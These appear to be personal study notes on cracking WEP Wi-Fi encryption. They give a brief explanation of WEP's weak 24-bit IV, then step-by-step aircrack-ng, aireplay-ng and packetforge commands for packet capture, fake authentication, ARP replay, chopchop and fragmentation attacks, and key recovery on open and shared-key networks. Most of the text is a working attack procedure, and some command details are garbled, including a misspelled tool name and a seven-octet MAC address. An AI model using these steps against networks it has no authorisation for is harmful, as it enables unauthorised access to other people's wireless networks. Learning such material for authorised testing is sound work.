# WEP = Wired Equivalent Privacy
- uses RC4 algorithm
- old encryption
- easily racked

- each packet is encrypted using a unique key stream
- Random initialization vector (IV) is used to generate the kets streams
- The initialization vector is only 24 bits
- IV + key (password) = key stream
- keystream + “Data to send the router” = ADFJGKFKAKJFJA
	- But the IV is appended to the packet, IV + ADFJGKFKAKJFJA
- The issue is that the IV is sent in plain text and the IV is only 24 bits
	- IVs will repeat in buy networks and makes WEP vulnerable to statistical attacks

# To crack WEP:
- Capture a large numbers of packets/IVs       > using airodump-ng
- Analyze the captured IVs and crack the key  > using aircrack-ng
![[Pasted image 20240116123303.png]]

- airodump-ng wlan0
   - Get the BSSID of the target WEP network
- airodump-ng --bssid  00:1A:70:70:69:4B --channel 11 --write WEP_ConnectMe wlan0
   - We want to see a large number under the \#Data column. This means there is a lot of traffic flowing through this network
   - The data we are interested in is in the .cap file
-  aircrack-ng WEP_ConnectMe-01.cap
   - If we found the key, you will see “KEY FOUND!”
   - You can connect using both keys
      - 1- use the key without the “:” or use the ASCII one as is.

![[Pasted image 20240116123420.png]]

# If the network is not busy, we need to generate traffic on the WEP network.
- airodump-ng --bssid  00:1A:70:70:69:4B --channel 11 --write WEP_ConnectMe wlan0
- aireplay-ng --fakeauth 0 -a 00:1A:70:70:69:4B -h 00:11:22:33:44:55:66 wlan0
   - Associate with the AP before performing the attack
   - a = MAC of WEP AP
   - h = MAC of wireless card
      - 1- ifconfig, first 12 letters of the unspec field (make sure to replace the minuses with colons)
- Force AP to generate new IVs by resending the AP ARP packets
   - aireplay-ng --arpreplay -b 00:1A:70:70:69:4B -h 00:11:22:33:44:55:66 wlan0
- aircrack-ng WEP_ConnectMe-01.cap
   - have the airodump-ng and the arpreplay windows open and running. We want to continue to generate as much traffic as needed.


# Other attacks to generate traffic:
- chop chop
   - aireplay-ng --chopchop -b 00:1A:70:70:69:4B -h 00:11:22:33:44:55:66 wlan0
   - packerforge-ng 0 -a 00:1A:70:70:69:4B -h 00:11:22:33:44:55:66 -k 255.255.255.255 -l 255.255.255.255 -y file.xor -w chopchop-forced-packet
   - aireplay-ng --fakeauth 0 -a 00:1A:70:70:69:4B -h 00:11:22:33:44:55:66 wlan0
   - aireplay-ng -2 -r chopchop-forced-packet wlan0
   - aircrack-ng chopchop.cap
- Fragmentation
   - airodump-ng --bssid  00:1A:70:70:69:4B --channel 11 --write WEP_ConnectMe wlan0
   - aireplay-ng --fakeauth 0 -a 00:1A:70:70:69:4B -h 00:11:22:33:44:55:66 wlan0 
   - aireplay-ng --fragment -b 00:1A:70:70:69:4B -h 00:11:22:33:44:55:66 wlan0
   - packerforge-ng 0 -a 00:1A:70:70:69:4B -h 00:11:22:33:44:55:66 -k 255.255.255.255 -l 255.255.255.255 -y fragment.xor -w fragment-forced-packet
   - aireplay-ng --fakeauth 0 -a 00:1A:70:70:69:4B -h 00:11:22:33:44:55:66 wlan0
   - aireplay-ng -2 -r fragment-forced-packet wlan0
   - aircrack-ng fragment.cap

# If WEP is configured not to have open authentication but with shared key authentication
- This will prevent us from associating with the router if we do not know the shared key
	- AUTH = SKA, open networks will show OPN

- ARP attack
   - airodump-ng --bssid  00:1A:70:70:69:4B --channel 11 --write ska_test wlan0
   - aireplay-ng --arpreplay -b 00:1A:70:70:69:4B -h 00:11:22:33:44:55:66 wlan0
      - 1- b = MAC of WEP AP
      - 2- h = MAC of a connected client
   - aircrack-ng arp.cap
      - 1- keep both windows from above commands open
   - This attack will work woth OPN and SKA authentication WEP networks. It just requires that you have a client connected.

